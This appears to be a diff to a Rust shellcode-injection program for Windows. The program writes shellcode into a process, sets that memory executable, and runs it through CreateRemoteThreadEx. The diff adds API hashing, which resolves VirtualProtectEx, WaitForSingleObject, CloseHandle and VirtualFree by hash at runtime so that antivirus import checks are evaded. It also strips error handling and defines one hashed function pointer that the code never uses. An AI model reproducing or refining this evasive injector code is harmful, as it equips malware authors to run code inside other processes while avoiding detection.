@@ -68,7 +68,7 @@ type TCreateRemoteThreadEx = unsafe extern "system" fn(
     lpstartaddress: LPTHREAD_START_ROUTINE,
     lpparameter: Option<*const c_void>,
     dwcreationflags: u32,
-    lpattributelist: LPPROC_THREAD_ATTRIBUTE_LIST,
+    lpattributelist: Option<LPPROC_THREAD_ATTRIBUTE_LIST>,
     lpthreadid: Option<*mut u32>
 ) -> HANDLE;
 
@@ -103,7 +103,7 @@ fn getFuncAddressByHash(lib: &str, hash: u32) -> *const u32 {
 
         match libBase {
             Ok(h) => {
-                println!("\n\n");
+                println!("\n");
                 let base_ptr: *const u8 = h.0 as *const u8;
                 println!("[+] Module Handle: {:?}", base_ptr);
                 
@@ -190,7 +190,7 @@ fn main() {
 
     //getFuncAddressByHash("kernel32", 0xf92f7b);
 
-    println!("{:#x}", getHashFromFunc("WriteProcessMemory"));
+    println!("{:#x}", getHashFromFunc("VirtualFree"));
 
     let pid = process::id();
 
@@ -241,18 +241,18 @@ fn main() {
         );
 
         let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtectEx(
+        let XVirtualProtectEx: TVirtualProtectEx = mem::transmute(getFuncAddressByHash("kernel32.dll", 0xc4edec) as *const u32);
+        XVirtualProtectEx(
             hprocess,
             haddr,
             shellcode.len(),
             PAGE_EXECUTE_READWRITE,
-            &mut oldprotect,).unwrap_or_else(|e| {
-            eprintln!("[!] VirtualProtectEx Failed With Error: {}", e);
-            let _ = CloseHandle(hprocess);
-            process::exit(-1);
-        });
+            &mut oldprotect,
+        );
         
         println!("[+] Creating a Remote Thread");
+        let XCreateRemoteThreadEx: TCreateRemoteThreadEx = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x857934) as *const u32);
+        
         let hthread = CreateRemoteThreadEx(
             hprocess,
             Some(null()),
@@ -268,15 +268,19 @@ fn main() {
             }
         );
 
-        WaitForSingleObject(hthread, INFINITE);
+        let XWaitForSingleObject: TWaitForSingleObject = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x397566) as *const u32);
+        XWaitForSingleObject(hthread, INFINITE);
 
-        let _ = CloseHandle(hthread);
+        let XCloseHandle: TCloseHandle = mem::transmute(getFuncAddressByHash("kernel32.dll", 0xbdd9cb) as *const u32);
+
+        let _ = XCloseHandle(hthread);
         println!("[i] Closed thread handle");
 
-        let _ = CloseHandle(hprocess);
+        let _ = XCloseHandle(hprocess);
         println!("[i] Closed process handle");
 
-        let _ = VirtualFree(haddr, 0, MEM_RELEASE);
+        let XVirtualFree: TVirtualFree = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x675a2) as *const u32);
+        let _ = XVirtualFree(haddr, 0, MEM_RELEASE);
         println!("[i] Memory released");
 
 
